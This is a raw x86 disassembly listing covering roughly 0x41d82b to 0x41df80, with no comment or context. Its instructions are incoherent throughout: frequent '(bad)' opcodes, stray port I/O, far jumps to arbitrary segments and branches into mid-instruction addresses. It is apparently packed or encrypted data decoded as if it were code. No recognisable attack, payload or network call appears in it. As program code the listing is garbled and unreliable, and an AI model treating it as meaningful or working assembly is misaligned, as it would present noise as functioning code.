  41d82b:	imul   esi,DWORD PTR [eax],0x8674cef2
  41d831:	fmul   QWORD PTR [edx+esi*1]
  41d834:	jl     0x41d8ae
  41d836:	cs cwde 
  41d838:	mov    ecx,ebx
  41d83a:	cs fwait
  41d83c:	jg     0x41d812
  41d83e:	sbb    dh,ah
  41d840:	mov    ds:0xafe99425,eax
  41d845:	ror    DWORD PTR [ebp-0x6d47368],1
  41d84b:	pop    ecx
  41d84c:	adc    cl,dl
  41d84e:	push   cs
  41d84f:	dec    esp
  41d850:	in     eax,0xf9
  41d852:	imul   edi,ebx,0x20446872
  41d858:	jl     0x41d8c3
  41d85a:	adc    al,0x21
  41d85c:	jmp    0x41d83f
  41d85e:	retfw  0x3839
  41d862:	lds    esi,FWORD PTR gs:[eax+0x16]
  41d866:	cmp    DWORD PTR [ebx+0x2ad4b97],ecx
  41d86c:	fwait
  41d86d:	loop   0x41d806
  41d86f:	bound  eax,QWORD PTR [ecx-0x3c988739]
  41d875:	loope  0x41d816
  41d877:	je     0x41d804
  41d879:	inc    esi
  41d87a:	rol    BYTE PTR [ebx+ecx*8],cl
  41d87d:	pop    ebx
  41d87e:	(bad)  
  41d87f:	ins    DWORD PTR es:[edi],dx
  41d880:	arpl   cx,si
  41d882:	mov    edi,DWORD PTR [edi]
  41d884:	clc    
  41d885:	rcr    BYTE PTR [esi+0x20217444],cl
  41d88b:	or     al,0x56
  41d88d:	inc    ebp
  41d88e:	enter  0x7268,0xe
  41d892:	xchg   DWORD PTR [esp+edi*2+0x1180299e],edi
  41d899:	mov    ?,ecx
  41d89b:	mov    dh,0x45
  41d89d:	adc    eax,0x1f24054b
  41d8a2:	ds jecxz 0x41d8d3
  41d8a5:	mov    ch,BYTE PTR [ecx-0x3a]
  41d8a8:	inc    cx
  41d8aa:	xchg   ebx,eax
  41d8ab:	pop    ecx
  41d8ac:	sub    edx,DWORD PTR [ebp+eax*1+0x4e59455a]
  41d8b3:	sub    al,bl
  41d8b5:	xchg   ecx,eax
  41d8b6:	in     al,0xd4
  41d8b8:	(bad)  
  41d8b9:	pop    edx
  41d8ba:	xchg   ebx,eax
  41d8bb:	mul    BYTE PTR gs:[esi]
  41d8be:	push   ebp
  41d8bf:	jnp    0x41d850
  41d8c1:	fs add esp,esi
  41d8c4:	push   es
  41d8c5:	stc    
  41d8c6:	pop    esi
  41d8c7:	cmp    eax,0x5a6c60c8
  41d8cc:	xor    eax,0xb98417e1
  41d8d1:	mov    BYTE PTR [ebx+0x3ed21d1],dh
  41d8d7:	push   esp
  41d8d8:	inc    ebp
  41d8d9:	pop    ebx
  41d8da:	cmc    
  41d8db:	jne    0x41d865
  41d8dd:	ret    0x4f22
  41d8e0:	add    BYTE PTR [ebx-0x1a],0xd3
  41d8e4:	pop    edx
  41d8e5:	mov    ecx,0x7227d49a
  41d8ea:	call   0x8ef30025
  41d8ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8f0:	std    
  41d8f1:	pop    es
  41d8f2:	imul   edi,DWORD PTR [edi+0x39162451],0xfffffffe
  41d8f9:	sub    DWORD PTR [eax],edi
  41d8fb:	sar    BYTE PTR [edi+0x13],0x6d
  41d8ff:	ja     0x41d92a
  41d901:	and    edx,DWORD PTR [edi+0x75]
  41d904:	sub    bh,BYTE PTR [eax+0x647d3655]
  41d90a:	push   DWORD PTR [ebx]
  41d90c:	dec    ecx
  41d90d:	cli    
  41d90e:	out    dx,eax
  41d90f:	arpl   WORD PTR [eax-0x20],ax
  41d912:	mov    bh,0x1
  41d914:	sub    edx,DWORD PTR [esi-0x7bf4d408]
  41d91a:	and    eax,0x5aebe104
  41d91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d920:	test   BYTE PTR [eax],ch
  41d922:	push   edi
  41d923:	cs loopne 0x41d941
  41d926:	mov    ecx,0xb5a8b578
  41d92b:	jmp    0x69c1:0xf99fb250
  41d932:	outs   dx,BYTE PTR ds:[esi]
  41d933:	mov    ds:0x5aaaed10,eax
  41d938:	adc    cl,BYTE PTR [eax+0x45e7f4f5]
  41d93e:	cmp    ecx,DWORD PTR [ebp-0x2439017f]
  41d944:	cwde   
  41d945:	pop    ebx
  41d946:	sub    bh,ch
  41d948:	dec    ecx
  41d949:	and    al,0xa5
  41d94b:	fisttp DWORD PTR [ebx+0x68]
  41d94e:	fbld   TBYTE PTR [edx]
  41d950:	fnclex 
  41d952:	mov    dl,0x3
  41d954:	rcr    edi,1
  41d956:	mov    edx,0xb0afe229
  41d95b:	xor    dl,al
  41d95d:	xchg   edx,eax
  41d95e:	inc    ebp
  41d95f:	rcr    DWORD PTR [edx+ebx*4-0x76],cl
  41d963:	jo     0x41d91d
  41d965:	xor    cl,BYTE PTR [eax-0x5d9116e8]
  41d96b:	jnp    0x41d9a0
  41d96d:	xchg   ecx,eax
  41d96e:	or     eax,0x6e3f0179
  41d973:	xor    al,0x96
  41d975:	inc    ebx
  41d976:	fadd   QWORD PTR [ebp-0x51a9dd53]
  41d97c:	retf   
  41d97d:	and    DWORD PTR [eax+ecx*8],esp
  41d980:	mov    esp,0xd4bf20f1
  41d985:	fstp   DWORD PTR [ebx-0x17a0fad4]
  41d98b:	(bad)  
  41d98c:	xchg   ebx,eax
  41d98d:	or     eax,DWORD PTR [eax]
  41d98f:	in     al,0x31
  41d991:	das    
  41d992:	xchg   esi,eax
  41d993:	das    
  41d994:	push   cs
  41d995:	jp     0x41d9fc
  41d997:	sub    al,0x87
  41d999:	mov    al,0xed
  41d99b:	fdivr  QWORD PTR [ebx]
  41d99d:	std    
  41d99e:	dec    esi
  41d99f:	cmp    ah,bl
  41d9a1:	xor    eax,0x1ce1c94d
  41d9a6:	aas    
  41d9a7:	(bad)  
  41d9a8:	fidiv  WORD PTR gs:[ecx]
  41d9ab:	(bad)  
  41d9ac:	pop    eax
  41d9ad:	push   es
  41d9ae:	mov    eax,ds:0x54bbd7b
  41d9b3:	stos   BYTE PTR es:[edi],al
  41d9b4:	lds    esi,FWORD PTR [eax-0x1632962f]
  41d9ba:	not    DWORD PTR [esi]
  41d9bc:	xor    edi,DWORD PTR [edx]
  41d9be:	pushf  
  41d9bf:	dec    ecx
  41d9c0:	pop    edi
  41d9c1:	push   esi
  41d9c2:	mov    eax,0x3ad92cc4
  41d9c7:	shl    DWORD PTR [ebx+eax*2-0x71],1
  41d9cb:	dec    eax
  41d9cc:	xor    eax,ebp
  41d9ce:	mov    ebx,0x9b186277
  41d9d3:	aaa    
  41d9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9d5:	inc    ebp
  41d9d6:	xor    dh,dl
  41d9d8:	pop    ds
  41d9d9:	mov    ds:0xea726bdf,eax
  41d9de:	pop    eax
  41d9df:	outs   dx,BYTE PTR ds:[esi]
  41d9e0:	xchg   ebx,eax
  41d9e1:	xchg   edx,eax
  41d9e2:	test   eax,0xffc3a1e3
  41d9e7:	xchg   esi,eax
  41d9e8:	or     edx,ebp
  41d9ea:	dec    ecx
  41d9eb:	xchg   ebp,eax
  41d9ec:	dec    edx
  41d9ed:	icebp  
  41d9ee:	call   FWORD PTR [esi+0x15]
  41d9f1:	fld    QWORD PTR [eax+0x1ef91b0d]
  41d9f7:	cmp    al,0xe0
  41d9f9:	cs add eax,0x515f894a
  41d9ff:	push   ss
  41da00:	sbb    BYTE PTR [edi+ebx*8],0x48
  41da04:	and    eax,0x43a88da9
  41da09:	jle    0x41da43
  41da0b:	push   es
  41da0c:	rcl    BYTE PTR [esi-0x4a89f91e],cl
  41da12:	and    DWORD PTR [esi],edi
  41da14:	mov    edi,DWORD PTR [edx+0x30]
  41da17:	sar    bh,cl
  41da19:	cdq    
  41da1a:	add    BYTE PTR [ebx-0x1e],ah
  41da1d:	add    al,0x98
  41da1f:	jge    0x41d9c0
  41da21:	jae    0x41da3f
  41da23:	test   al,0x48
  41da25:	mov    DWORD PTR [eax],ecx
  41da27:	call   0x8871:0x884c5b60
  41da2e:	je     0x41da6f
  41da30:	xchg   ebp,eax
  41da31:	push   0x3c
  41da33:	jmp    ebp
  41da35:	shl    DWORD PTR fs:[ecx-0x7a],1
  41da39:	sub    esi,DWORD PTR [eax-0x6c]
  41da3c:	fbld   TBYTE PTR [ecx+ebx*4+0x3b]
  41da40:	leave  
  41da41:	je     0x41da87
  41da43:	adc    al,0x3f
  41da45:	push   DWORD PTR [ebx+0x22]
  41da48:	sbb    ebx,DWORD PTR [ecx]
  41da4a:	or     al,0x9f
  41da4c:	test   BYTE PTR [edi+0x5a],bl
  41da4f:	dec    eax
  41da50:	dec    eax
  41da52:	fimul  DWORD PTR [edx]
  41da54:	or     al,0xa7
  41da56:	pop    edi
  41da57:	inc    ecx
  41da58:	mov    cl,0x9b
  41da5a:	lds    ecx,FWORD PTR [ecx+eiz*4-0x29bb4d77]
  41da61:	outs   dx,DWORD PTR ds:[esi]
  41da62:	fdiv   DWORD PTR [eax]
  41da64:	mov    ecx,0x8a24c014
  41da69:	jo     0x41d9ee
  41da6b:	ins    BYTE PTR es:[edi],dx
  41da6c:	jl     0x41dad7
  41da6e:	jne    0x41daac
  41da70:	rcl    cl,0xc9
  41da73:	adc    BYTE PTR [eax+0xa1d66cf],ah
  41da79:	sbb    ah,ch
  41da7b:	loop   0x41dade
  41da7d:	and    ch,al
  41da7f:	repnz sahf 
  41da81:	fdiv   DWORD PTR [edi+0x60b93e25]
  41da87:	test   DWORD PTR [edi],esi
  41da89:	lods   eax,DWORD PTR ss:[esi]
  41da8b:	push   ebx
  41da8c:	xor    edx,DWORD PTR [ecx]
  41da8e:	dec    ebp
  41da8f:	cmp    BYTE PTR [edx-0x6f3d9d53],cl
  41da95:	ret    
  41da96:	lods   eax,DWORD PTR ds:[esi]
  41da97:	nop
  41da98:	ds ins DWORD PTR es:[edi],dx
  41da9a:	cmc    
  41da9b:	jge    0x41daa8
  41da9d:	lahf   
  41da9e:	xchg   edx,eax
  41da9f:	inc    esp
  41daa0:	loop   0x41dab4
  41daa2:	push   ebx
  41daa3:	push   ds
  41daa4:	jno    0x41dafe
  41daa6:	mov    ebp,0xdaf307b0
  41daab:	mov    eax,0xe370c583
  41dab0:	dec    ecx
  41dab1:	push   ebx
  41dab2:	lods   eax,DWORD PTR ds:[esi]
  41dab3:	ret    0xf92c
  41dab6:	sbb    al,0xa4
  41dab8:	mov    ch,0xe9
  41daba:	push   ebx
  41dabb:	add    eax,0xa0549cf6
  41dac0:	call   0x4d7fb9eb
  41dac5:	int3   
  41dac6:	fadd   st(1),st
  41dac8:	aam    0xe8
  41daca:	add    al,0x19
  41dacc:	push   es
  41dacd:	les    ebp,FWORD PTR [esi]
  41dacf:	scas   al,BYTE PTR es:[edi]
  41dad0:	jp     0x41daf3
  41dad2:	sbb    DWORD PTR [ecx+0x28],0xffffffe9
  41dad6:	pop    eax
  41dad7:	(bad)  
  41dad8:	ficomp WORD PTR [eax-0x6109fb9f]
  41dade:	imul   BYTE PTR [esi-0x64d69936]
  41dae4:	sbb    eax,0x3cef3324
  41dae9:	cld    
  41daea:	sub    ah,BYTE PTR [esi-0x4dfce8ff]
  41daf0:	stc    
  41daf1:	push   edx
  41daf2:	xlat   BYTE PTR ds:[ebx]
  41daf3:	retf   
  41daf4:	push   edi
  41daf5:	les    ecx,FWORD PTR [eax]
  41daf7:	add    dh,ch
  41daf9:	adc    DWORD PTR [ebx+0x27294151],edi
  41daff:	jo     0x41daea
  41db01:	fistp  QWORD PTR [ebx-0x5f]
  41db04:	into   
  41db05:	mov    ss,WORD PTR [eax]
  41db07:	mov    DWORD PTR [esi-0xf],0x79a8498e
  41db0e:	fldenv [ebp+0xa41538e]
  41db14:	aad    0x3d
  41db16:	(bad)  
  41db17:	mov    ds:0xbca5b2fb,al
  41db1c:	test   BYTE PTR [ecx+0x41],0xb9
  41db20:	lea    eax,[esi-0xe4c563]
  41db26:	in     eax,dx
  41db27:	shr    DWORD PTR [ecx+0x7],0x5c
  41db2b:	inc    ecx
  41db2c:	mov    ds:0xdbb89d6c,eax
  41db31:	xor    dh,BYTE PTR [ebx]
  41db33:	mov    eax,ds:0x241915d5
  41db38:	pand   mm2,mm4
  41db3b:	jnp    0x41db26
  41db3d:	sahf   
  41db3e:	jae    0x41db41
  41db40:	rol    BYTE PTR [edx],1
  41db42:	and    DWORD PTR [edx-0x7f],0x116a5e47
  41db49:	lds    edi,FWORD PTR [edx+0x6b0dd9b3]
  41db4f:	mov    al,0xf0
  41db51:	test   BYTE PTR [esi-0x39],bl
  41db54:	inc    ecx
  41db55:	aad    0x33
  41db57:	pop    ecx
  41db58:	leave  
  41db59:	lahf   
  41db5a:	fdivr  QWORD PTR [esi-0x3a]
  41db5d:	lea    ebx,[eax+edi*1-0x7505545f]
  41db64:	push   edx
  41db65:	push   ds
  41db66:	aad    0x19
  41db68:	aad    0xa4
  41db6a:	icebp  
  41db6b:	lock test eax,0xfcee9eda
  41db71:	adc    dh,BYTE PTR [eax+0x50]
  41db74:	xchg   ebp,eax
  41db75:	cmp    al,0x8c
  41db77:	xlat   BYTE PTR ds:[ebx]
  41db78:	mov    ebx,0x55bac9e2
  41db7d:	mov    cl,BYTE PTR [esi]
  41db7f:	jp     0x41dbfe
  41db81:	jmp    FWORD PTR [ecx]
  41db83:	pop    eax
  41db84:	ins    BYTE PTR es:[edi],dx
  41db85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db86:	push   cs
  41db87:	fwait
  41db88:	out    dx,eax
  41db89:	sub    DWORD PTR [esi],esp
  41db8b:	mov    esi,0xd1a91580
  41db90:	aam    0xec
  41db92:	xchg   edx,eax
  41db93:	push   esi
  41db94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db95:	push   edi
  41db96:	outs   dx,DWORD PTR ds:[esi]
  41db97:	loope  0x41db28
  41db99:	sbb    DWORD PTR [ecx+0x70],esp
  41db9c:	fstp   st(3)
  41db9e:	pop    esi
  41db9f:	cdq    
  41dba0:	in     eax,dx
  41dba1:	das    
  41dba2:	add    al,BYTE PTR [ebx+0x5]
  41dba5:	sub    eax,0xa9e1e1cd
  41dbaa:	jno    0x41dba7
  41dbac:	into   
  41dbad:	cvttps2pi mm5,xmm7
  41dbb0:	mov    ch,0x1c
  41dbb2:	imul   ebp,DWORD PTR [ecx+0x69],0xfe01f5d2
  41dbb9:	fidiv  WORD PTR [ecx]
  41dbbb:	push   esp
  41dbbc:	inc    ebx
  41dbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbe:	xor    eax,0xbd801128
  41dbc3:	push   ecx
  41dbc4:	enter  0xd339,0xda
  41dbc8:	neg    DWORD PTR [eax-0x34b9b6ec]
  41dbce:	and    ebp,DWORD PTR ds:0xd4276e29
  41dbd4:	(bad)  
  41dbd5:	jmp    0x41db85
  41dbd7:	outs   dx,DWORD PTR ds:[esi]
  41dbd8:	out    0x46,eax
  41dbda:	in     al,0xd9
  41dbdc:	or     bl,cl
  41dbde:	je     0x41dbf7
  41dbe0:	xor    DWORD PTR [esi+eiz*1],ebx
  41dbe3:	xchg   ecx,eax
  41dbe4:	sub    dh,BYTE PTR [esi+ebp*1]
  41dbe7:	loopne 0x41dc55
  41dbe9:	fidivr DWORD PTR [ecx+esi*4-0x5e9744f1]
  41dbf0:	dec    edx
  41dbf1:	mov    bh,0x0
  41dbf3:	cmp    BYTE PTR [ecx+0x40f6868c],cl
  41dbf9:	mov    ebx,0xb1bb8640
  41dbfe:	cmp    edi,DWORD PTR [edx]
  41dc00:	xlat   BYTE PTR ds:[ebx]
  41dc01:	adc    eax,0x99314adf
  41dc06:	ret    
  41dc07:	jnp    0x41dbe8
  41dc09:	pop    esi
  41dc0a:	int3   
  41dc0b:	leave  
  41dc0c:	aam    0xd1
  41dc0e:	sbb    ch,cl
  41dc10:	in     eax,dx
  41dc11:	mov    bl,0xf
  41dc13:	dec    edx
  41dc15:	push   es
  41dc16:	sbb    ch,ch
  41dc18:	and    bh,dh
  41dc1a:	xor    eax,0x16651ca0
  41dc1f:	cdq    
  41dc20:	xor    BYTE PTR [esi],bl
  41dc22:	fs cmp ah,ah
  41dc25:	dec    eax
  41dc26:	fistp  DWORD PTR [ecx]
  41dc28:	mov    ?,WORD PTR [eax+0x7f670070]
  41dc2e:	dec    ebx
  41dc2f:	outs   dx,BYTE PTR ds:[esi]
  41dc30:	addr16 (bad) 
  41dc32:	rcl    DWORD PTR [ebx-0x7d4ddc31],0x93
  41dc39:	add    al,0xe9
  41dc3b:	bound  edx,QWORD PTR [ecx-0x37]
  41dc3e:	mov    cl,0xfd
  41dc40:	sahf   
  41dc41:	ins    BYTE PTR es:[edi],dx
  41dc42:	xor    BYTE PTR [ebp-0x2f],ch
  41dc45:	addr16 test al,0x4b
  41dc48:	or     BYTE PTR [ebx+ebp*2+0x7dcabc62],bl
  41dc4f:	mov    ds:0x8a8f4822,al
  41dc54:	and    edx,DWORD PTR [ebp-0x28]
  41dc57:	and    BYTE PTR [esi-0x76],al
  41dc5a:	xchg   esp,eax
  41dc5b:	imul   ebp,DWORD PTR [eax],0x6ebeb30b
  41dc61:	rcl    DWORD PTR [esp+ecx*1],0x19
  41dc65:	mov    ebx,0xaf53deae
  41dc6a:	mov    ch,0x10
  41dc6c:	retf   0x915a
  41dc6f:	xchg   ecx,eax
  41dc70:	test   ah,dl
  41dc72:	mov    ebp,0xef90bec1
  41dc77:	inc    esi
  41dc78:	adc    bl,ah
  41dc7a:	jl     0x41dc55
  41dc7c:	sub    BYTE PTR [edi],ch
  41dc7e:	int    0x96
  41dc80:	and    bh,BYTE PTR [ecx]
  41dc82:	or     bh,0x7e
  41dc85:	out    0x4,al
  41dc87:	ret    
  41dc88:	sub    al,0xcd
  41dc8a:	outs   dx,DWORD PTR ds:[esi]
  41dc8b:	xor    cl,BYTE PTR [esi-0x70d6b42d]
  41dc91:	mov    edx,0x3e7f345
  41dc96:	xchg   edx,eax
  41dc97:	and    DWORD PTR [ebx],eax
  41dc99:	push   edx
  41dc9a:	mov    ds:0x45ebe409,eax
  41dc9f:	pop    esi
  41dca0:	jmp    0x41dd10
  41dca2:	dec    BYTE PTR [ecx-0x6dea7732]
  41dca8:	lods   eax,DWORD PTR cs:[esi]
  41dcaa:	dec    esp
  41dcab:	inc    BYTE PTR [edx+0x2217d292]
  41dcb1:	jmp    0x3bed6fa9
  41dcb6:	sbb    eax,0x20357cf0
  41dcbb:	and    esi,DWORD PTR [esp+esi*2+0x11]
  41dcbf:	stos   BYTE PTR es:[edi],al
  41dcc0:	mov    bh,0x91
  41dcc2:	push   esp
  41dcc3:	aas    
  41dcc4:	inc    edi
  41dcc5:	add    bl,ch
  41dcc7:	mov    cl,0x14
  41dcc9:	mov    ds:0x50cfc978,al
  41dcce:	js     0x41dd41
  41dcd0:	jne    0x41dd2b
  41dcd2:	sahf   
  41dcd3:	enter  0x8b25,0x12
  41dcd7:	pop    edx
  41dcd8:	or     edx,DWORD PTR [edx+ecx*1]
  41dcdb:	popa   
  41dcdc:	retf   0x347
  41dcdf:	push   ebx
  41dce0:	shl    BYTE PTR [ebp-0x2c5b0802],0x6a
  41dce7:	sub    dh,BYTE PTR [ebp+0x60011eb]
  41dced:	in     al,0xa
  41dcef:	(bad)  
  41dcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcf1:	mov    ds:0x16d1ca64,eax
  41dcf6:	adc    al,0x53
  41dcf8:	push   esi
  41dcf9:	mov    esp,0x228e8e82
  41dcfe:	push   esp
  41dcff:	clc    
  41dd00:	sbb    DWORD PTR [ebx+0x65e8196f],ebp
  41dd06:	or     eax,0x46de340f
  41dd0b:	push   0xc1f10a7c
  41dd10:	cmp    edx,edx
  41dd12:	scas   al,BYTE PTR es:[edi]
  41dd13:	xchg   edi,eax
  41dd14:	pop    eax
  41dd15:	mov    al,ds:0xc6c91ae0
  41dd1a:	xlat   BYTE PTR ds:[ebx]
  41dd1b:	(bad)
  41dd1e:	or     eax,DWORD PTR [esi]
  41dd20:	outs   dx,BYTE PTR ds:[esi]
  41dd21:	cdq    
  41dd22:	add    ecx,eax
  41dd24:	and    al,0xf3
  41dd26:	rcl    BYTE PTR [esi-0x3f0e4364],0x3a
  41dd2d:	jbe    0x41dd98
  41dd2f:	int3   
  41dd30:	pop    ds
  41dd31:	test   bh,dh
  41dd33:	and    DWORD PTR [ebx+0x2e8170a3],ecx
  41dd39:	lock lods eax,DWORD PTR ds:[esi]
  41dd3b:	inc    ecx
  41dd3c:	xlat   BYTE PTR ds:[ebx]
  41dd3d:	mov    BYTE PTR [esi],al
  41dd3f:	sahf   
  41dd40:	sar    DWORD PTR [esi+0x6fab342a],cl
  41dd46:	stos   DWORD PTR es:[edi],eax
  41dd47:	adc    ch,BYTE PTR [ecx+0x62422b4b]
  41dd4d:	sar    dl,cl
  41dd4f:	dec    esp
  41dd50:	add    al,0xe9
  41dd52:	xor    eax,0xbcfdde47
  41dd57:	and    ch,bl
  41dd59:	fmul   st,st(3)
  41dd5b:	icebp  
  41dd5c:	jmp    0x41dd11
  41dd5e:	mov    ds:0x7152e18f,al
  41dd63:	in     eax,0x98
  41dd65:	sub    ch,ah
  41dd67:	loope  0x41dd4a
  41dd69:	lods   al,BYTE PTR ds:[esi]
  41dd6a:	daa    
  41dd6b:	or     ebp,edx
  41dd6d:	stc    
  41dd6e:	inc    edx
  41dd6f:	cmp    ecx,DWORD PTR [edi+0x414c2c1f]
  41dd75:	loop   0x41dd4a
  41dd77:	dec    ecx
  41dd78:	add    DWORD PTR [ebx],0x1904cbc2
  41dd7e:	out    dx,al
  41dd7f:	pushf  
  41dd80:	in     eax,0x9d
  41dd82:	repnz xlat BYTE PTR ds:[ebx]
  41dd84:	clc    
  41dd85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd86:	hlt    
  41dd87:	xchg   esp,eax
  41dd88:	push   ebp
  41dd89:	out    0xd9,eax
  41dd8b:	mov    ah,0xe6
  41dd8d:	push   ebp
  41dd8e:	mov    WORD PTR [ecx],cs
  41dd90:	or     bl,dh
  41dd92:	and    eax,0x9be49be2
  41dd97:	enter  0x2b91,0x5e
  41dd9b:	sub    esp,ebp
  41dd9d:	adc    eax,0x56898c4b
  41dda2:	push   edi
  41dda3:	cmp    cl,al
  41dda5:	sub    eax,edx
  41dda7:	xchg   ebp,eax
  41dda8:	je     0x41dd37
  41ddaa:	and    eax,0xe140f570
  41ddaf:	mov    ds:0x18635bae,eax
  41ddb4:	int3   
  41ddb5:	push   ss
  41ddb6:	cmp    bl,BYTE PTR [eax-0x4c]
  41ddb9:	arpl   WORD PTR ss:[ecx+0x45],cx
  41ddbd:	xchg   esp,eax
  41ddbe:	fbstp  TBYTE PTR [edx]
  41ddc0:	sub    BYTE PTR [ecx+0x6c],dl
  41ddc3:	and    DWORD PTR [ecx-0x16],eax
  41ddc6:	imul   esi,ebx,0x72
  41ddc9:	sub    ch,BYTE PTR [eax]
  41ddcb:	lahf   
  41ddcc:	rcr    esp,cl
  41ddce:	inc    ebx
  41ddcf:	arpl   dx,ax
  41ddd1:	jecxz  0x41de2d
  41ddd3:	push   edx
  41ddd4:	dec    edx
  41ddd5:	pushf  
  41ddd6:	(bad)  
  41ddd7:	cmc    
  41ddd8:	or     DWORD PTR [edx+0x146b0a6b],esp
  41ddde:	and    al,0x47
  41dde0:	ins    DWORD PTR es:[edi],dx
  41dde1:	xor    dh,bh
  41dde3:	xor    DWORD PTR [ebx+0x2a6c80e7],esp
  41dde9:	jp     0x41ddec
  41ddeb:	dec    edi
  41ddec:	sub    eax,0x8a7ec93d
  41ddf1:	xchg   BYTE PTR [esi+0xa],dl
  41ddf4:	cs mov dl,0x7c
  41ddf7:	mov    ebx,0x318234dd
  41ddfc:	(bad)  
  41ddfd:	pop    eax
  41ddfe:	mov    edx,0x729e6f10
  41de03:	inc    edi
  41de04:	cmc    
  41de05:	and    dh,ah
  41de07:	stos   DWORD PTR es:[edi],eax
  41de08:	inc    esp
  41de09:	out    dx,eax
  41de0a:	jne    0x41ddc3
  41de0c:	dec    edi
  41de0d:	inc    esp
  41de0e:	retf   
  41de0f:	sub    al,0xb2
  41de11:	add    al,0x8f
  41de13:	(bad)  
  41de14:	retf   0x3eb2
  41de17:	fistp  WORD PTR [ecx+0x3bd4494f]
  41de1d:	stc    
  41de1e:	js     0x41ddae
  41de20:	loop   0x41de6b
  41de22:	icebp  
  41de23:	not    bh
  41de25:	dec    eax
  41de26:	retf   
  41de27:	sbb    al,0x1c
  41de29:	rdpmc  
  41de2b:	out    0xaf,eax
  41de2d:	mov    eax,0x574eb3e3
  41de32:	mov    bh,0x96
  41de34:	ds jmp 0x41de7c
  41de37:	fcmovnb st,st(7)
  41de3a:	dec    eax
  41de3b:	sub    al,0xbc
  41de3d:	ret    
  41de3e:	out    0x50,al
  41de40:	mov    al,ds:0xfcf5d425
  41de45:	out    dx,al
  41de46:	out    0x99,eax
  41de48:	push   ds
  41de49:	or     ch,BYTE PTR [edi-0x7a588943]
  41de4f:	jmp    0x3c4d4e0d
  41de54:	aam    0xae
  41de56:	jae    0x41de7b
  41de58:	call   0x3589:0x86d408ea
  41de5f:	jns    0x41ddfb
  41de61:	sbb    eax,ebx
  41de63:	je     0x41de1b
  41de65:	dec    ebp
  41de66:	out    dx,al
  41de67:	rcl    DWORD PTR [ebp-0x71],cl
  41de6a:	sub    bh,BYTE PTR [esi+0x51]
  41de6d:	add    DWORD PTR [ebp+0x54c12043],0xffffffe8
  41de74:	call   0xd52e:0x54fc96a4
  41de7b:	cdq    
  41de7c:	jp     0x41de4d
  41de7e:	adc    al,0x3a
  41de80:	shl    edi,cl
  41de82:	and    BYTE PTR [eiz*4-0x642ccea2],cl
  41de89:	pop    edx
  41de8a:	inc    edi
  41de8b:	jecxz  0x41def1
  41de8d:	scas   al,BYTE PTR es:[edi]
  41de8e:	sub    edx,DWORD PTR [esi-0xe]
  41de91:	in     al,0x85
  41de93:	push   cs
  41de94:	mov    al,ds:0x2b0c994d
  41de99:	(bad)  
  41de9a:	(bad)  
  41de9b:	sti    
  41de9c:	adc    DWORD PTR [edi],0xfffffff5
  41de9f:	jb     0x41dec6
  41dea1:	and    dh,BYTE PTR [ebp-0x3]
  41dea4:	inc    ebp
  41dea5:	cmc    
  41dea6:	sub    BYTE PTR [eax+ebx*2],ch
  41dea9:	xchg   ecx,eax
  41deaa:	jns    0x41de61
  41deac:	mov    esi,0xb95001ad
  41deb1:	aad    0xa1
  41deb3:	xchg   esi,eax
  41deb4:	fdiv   st,st(1)
  41deb6:	int3   
  41deb7:	out    dx,al
  41deb8:	adc    esp,DWORD PTR [ecx+eiz*4-0x19]
  41debc:	pop    ebp
  41debd:	pop    ss
  41debe:	push   0x8a740c72
  41dec3:	mov    eax,0x843a68f8
  41dec8:	rcr    BYTE PTR [ebp+edx*2-0x33],cl
  41decc:	repnz add ah,BYTE PTR [edx+0x74]
  41ded0:	xchg   edi,eax
  41ded1:	dec    eax
  41ded2:	(bad)  
  41ded3:	aas    
  41ded4:	mov    edx,eax
  41ded6:	cs jge 0x41df21
  41ded9:	pop    esp
  41deda:	mov    edi,0x15c987e0
  41dedf:	pop    esi
  41dee0:	jns    0x41dea3
  41dee2:	xchg   esp,eax
  41dee3:	ret    0xb939
  41dee6:	aas    
  41dee7:	push   esp
  41dee8:	scas   al,BYTE PTR es:[edi]
  41dee9:	xchg   ebx,eax
  41deea:	push   esi
  41deeb:	push   cs
  41deec:	inc    esp
  41deed:	mov    al,0x38
  41deef:	jae    0x41df04
  41def1:	daa    
  41def2:	inc    edi
  41def3:	sbb    dh,BYTE PTR [edi]
  41def5:	xor    eax,DWORD PTR [ebx-0x28]
  41def8:	ins    DWORD PTR es:[edi],dx
  41def9:	(bad)  
  41defb:	add    BYTE PTR [ecx+0x5d6cc3d7],bh
  41df01:	push   edx
  41df02:	mov    al,0xcb
  41df04:	xor    ch,BYTE PTR [edx-0x607cfc88]
  41df0a:	and    edx,DWORD PTR [ecx+0x38]
  41df0d:	aaa    
  41df0e:	loop   0x41df0e
  41df10:	xchg   BYTE PTR [edi-0x7d15742b],ch
  41df16:	rcl    DWORD PTR [edx-0x35313c71],cl
  41df1c:	add    BYTE PTR [ebx],cl
  41df1e:	or     al,0x8c
  41df20:	dec    ebp
  41df21:	inc    eax
  41df22:	sti    
  41df23:	dec    edx
  41df24:	push   esp
  41df25:	mov    dh,0x23
  41df27:	mov    ch,0x23
  41df29:	ss je  0x41df9e
  41df2c:	scas   al,BYTE PTR es:[edi]
  41df2d:	cmp    ah,BYTE PTR [edx]
  41df2f:	arpl   cx,cx
  41df31:	cmp    al,0x46
  41df33:	add    bh,BYTE PTR [ecx]
  41df35:	xchg   esp,eax
  41df36:	cli    
  41df37:	jge    0x41df0e
  41df39:	mov    al,0x17
  41df3b:	mov    dl,dh
  41df3d:	jg     0x41df58
  41df3f:	js     0xbedd2fac
  41df45:	pop    ebp
  41df46:	pop    ds
  41df47:	add    BYTE PTR [esi+0x7f50c179],dl
  41df4d:	cmp    ch,BYTE PTR [ebx-0x66]
  41df50:	aam    0x6a
  41df52:	mov    edx,0xc1dbe6ec
  41df57:	mov    ecx,0x74341741
  41df5c:	ja     0x41dfb4
  41df5e:	sbb    esp,esp
  41df60:	dec    esi
  41df61:	jnp    0x41dfd3
  41df63:	jmp    0x6d6a75b9
  41df68:	mov    al,ds:0x8feebf40
  41df6d:	(bad)  
  41df6e:	mov    esp,0xc6d58642
  41df73:	mov    ebp,0x1355ee34
  41df78:	pop    ebx
  41df79:	sbb    DWORD PTR [eax-0x33da1715],ebp
  41df7f:	ins    BYTE PTR es:[edi],dx
  41df80:	adc    eax,0x9f6b4f06
